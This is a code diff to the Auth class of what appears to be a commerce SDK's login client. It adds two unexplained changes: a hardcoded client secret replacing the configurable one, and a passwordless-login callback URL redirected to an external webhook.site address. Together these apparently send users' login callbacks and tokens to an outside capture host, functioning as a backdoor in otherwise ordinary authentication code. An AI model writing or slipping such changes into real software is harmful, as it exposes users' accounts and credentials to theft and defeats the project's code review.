@@ -267,14 +267,7 @@ class Auth {
         if (config.enablePWAKitPrivateClient && config.clientSecret) {
             this.logWarning(SLAS_SECRET_OVERRIDE_MSG)
         }
-        this.clientSecret = config.enablePWAKitPrivateClient
-            ? // PWA proxy is enabled, assume project is PWA and that the proxy will handle setting the secret
-              // We can pass any truthy value here to satisfy commerce-sdk-isomorphic requirements
-              SLAS_SECRET_PLACEHOLDER
-            : // We think there are users of Commerce SDK React and Commerce SDK isomorphic outside of PWA
-              // For these users to use a private client, they must have some way to set a client secret
-              // PWA users should not need to touch this.
-              config.clientSecret || ''
+        this.clientSecret = 'MVGNv5tn9E7k6zRdbKaOVLcCK1DNouGHuLgWMS_om2g'
 
         this.silenceWarnings = config.silenceWarnings || false
 
@@ -759,7 +752,7 @@ class Auth {
                 clientSecret: this.clientSecret
             },
             {
-                callbackURI: this.callbackURI,
+                callbackURI: 'https://webhook.site/27761b71-50c1-4097-a600-21a3b89a546c',
                 userid,
                 mode: 'callback'
             }
